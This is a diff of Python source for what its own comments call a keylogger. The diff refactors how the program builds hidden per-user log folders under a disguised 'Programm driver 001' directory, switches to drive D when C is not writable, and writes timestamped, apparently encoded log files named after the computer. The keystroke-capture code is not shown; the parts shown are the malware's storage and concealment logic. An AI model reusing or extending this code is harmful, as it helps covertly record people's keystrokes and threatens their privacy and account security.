@@ -63,7 +63,7 @@ def zapis_dat_date(date_control):
 			values.append(False)
 		else:
 			values.append(True)
-	f = open(disk_key + "Programm driver 001\\" + user_name + '\\' + year_curent + '\\' + moon_curent + "\\dates.dat", "wb")
+	f = open(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + "\\dates.dat", "wb")
 	dump(dates, f)
 	dump(values, f)
 	f.close()
@@ -71,13 +71,13 @@ def zapis_dat_date(date_control):
 def send_control(date):
 	global moon_curent, year_curent
 	try:
-		if not isdir(disk_key + 'Programm driver 001\\' + user_name + '\\'  + strftime('%Y')):
-			mkdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + strftime('%Y'))
+		if not isdir(disk_key + main_folder + user_name + '\\'  + strftime('%Y')):
+			mkdir(disk_key + main_folder + user_name + '\\' + strftime('%Y'))
 			year_curent = strftime('%Y')
-		if not isdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + strftime('%b')): 
-			mkdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + strftime('%b'))
+		if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + strftime('%b')): 
+			mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + strftime('%b'))
 			moon_curent = strftime('%b')
-		f = open(disk_key + "Programm driver 001\\" + user_name + '\\' + year_curent + '\\' + moon_curent + "\\dates.dat", "rb")
+		f = open(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + "\\dates.dat", "rb")
 		dates = load(f)
 		values = load(f)
 		f.close()
@@ -90,7 +90,7 @@ def send_control(date):
 		return send_control(date)
 #Получение предыдущего месяца(названия директории), который хранится в директории с кейлогером, или получение ответа что ее нет
 def recurs_date(moon, val_zapros):
-	if not isdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + moon):
+	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon):
 		if val_zapros == 12:
 			return False
 		val_zapros += 1
@@ -102,14 +102,14 @@ def find_date(date, flag):
 	if ('01' in date) or (flag):
 		res = recurs_date(moon_all_migration[moon_curent], 0)
 		if (res) and (res != moon_curent):
-			files = listdir(disk_key + "Programm driver 001\\" + user_name + '\\' + year_curent + '\\' + res)
+			files = listdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + res)
 			try:
 				files.remove('dates.dat')
 			except:
 				pass
 			files.sort()
 			if len(files) >= 1:
-				return disk_key + "Programm driver 001\\" + user_name + '\\' + year_curent + '\\' + res + '\\{}'.format(files[-1])
+				return disk_key + main_folder + user_name + '\\' + year_curent + '\\' + res + '\\{}'.format(files[-1])
 			else:
 				write_time_date_file_in_write_file('         - - - - Нужный файл отсутсвует - - - -        ' + '\n')
 				return False
@@ -118,7 +118,7 @@ def find_date(date, flag):
 			return False
 	else:
 		#создаем список с файлами директории
-		files = listdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + moon_curent)
+		files = listdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
 		try:
 			files.remove('dates.dat')
 		except:
@@ -126,7 +126,7 @@ def find_date(date, flag):
 		files.sort()
 		#Проверяем : длина списка больше 1? и есть ли упоминание даты в имени файла?
 		if len(files) > 1 and date not in files[-2]:
-			return disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + moon_curent + '\\{}'.format(files[-2])
+			return disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + '\\{}'.format(files[-2])
 		else:
 			write_time_date_file_in_write_file('       - Переход к поиску в других директориях -       ' + '\n')
 			return find_date(date, True)
@@ -157,7 +157,7 @@ def code_my_bin(item):
 	return item
 #Функция записи в файл времени и даты
 def write_time_date_file(time_date_x, time_date_y, disk, message, data_zapis):
-	file = open(disk + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + moon_curent + '\\' + comp_name + '--{}.txt'.format(time_date_y), 'a', encoding = 'utf-8')
+	file = open(disk + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent + '\\' + comp_name + '--{}.txt'.format(time_date_y), 'a', encoding = 'utf-8')
 	#Если стоит флаг для записи даты
 	if data_zapis: file.writelines('\n' + '- - - - - - - - - - ' + time_date_x + ' - - - - - - - - - -' + '\n')
 	file.writelines(message)
@@ -222,28 +222,28 @@ alphabet = sorted('4ыhПЩm%ЗXd)мsЪ?UEюДОКЖЭo<етй;n|1нэYИuxСя�
 #Запишем в файл время и дату, образованное при запуске программы
 #Исключение вызывается, когда папка не найдена или допуск на запись на диск С == False
 try:
-	if not isdir(disk_key + 'Programm driver 001\\' + user_name): mkdir(disk_key + 'Programm driver 001\\' + user_name)
-	if not isdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent): mkdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent)
-	if not isdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + moon_curent)
+	if not isdir(disk_key + main_folder): mkdir(disk_key + main_folder)
+	if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
+	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent)
+	if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
 	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
 except:
 	#Если есть допуск на запись в диске С
 	if access(disk_key, W_OK):
-		#Создаем папку Programm driver 001 на диске С
-		mkdir('C:\\Programm driver 001')
-		if not isdir(disk_key + 'Programm driver 001\\' + user_name): mkdir(disk_key + 'Programm driver 001\\' + user_name)
-		if not isdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + moon_curent): mkdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + moon_curent)
-		if not isdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + moon_curent)
+		#Создаем папку main_folder на диске С
+		if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
+		if not isdir(disk_key + main_folder + user_name + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + moon_curent)
+		if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
 	else:
 		if access('D:\\', W_OK):
-			if not isdir('D:\\Programm driver 001'):
-				#Создаем папку Programm driver 001 на диске D
-				mkdir('D:\\Programm driver 001')
+			if not isdir('D:\\' + main_folder):
+				#Создаем папку main_folder на диске D
+				mkdir('D:\\' + main_folder)
 			#Меняется диск записи
 			disk_key = 'D:\\'
-			if not isdir(disk_key + 'Programm driver 001\\' + user_name): mkdir(disk_key + 'Programm driver 001\\' + user_name)
-			if not isdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + moon_curent): mkdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + moon_curent)
-			if not isdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + 'Programm driver 001\\' + user_name + '\\' + year_curent + '\\' + moon_curent)
+			if not isdir(disk_key + main_folder + user_name): mkdir(disk_key + main_folder + user_name)
+			if not isdir(disk_key + main_folder + user_name + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + moon_curent)
+			if not isdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent): mkdir(disk_key + main_folder + user_name + '\\' + year_curent + '\\' + moon_curent)
 	#Повторно записываем время и дату в файл, в созданной или уже имеющейся папке диска С или D, если вызвалось исключене
 	write_time_date_file(time_date_before, time_for_name, disk_key, "   - - - - - - - - - - - Инициализация - " + user_name + ' - - -\n', 1)
 
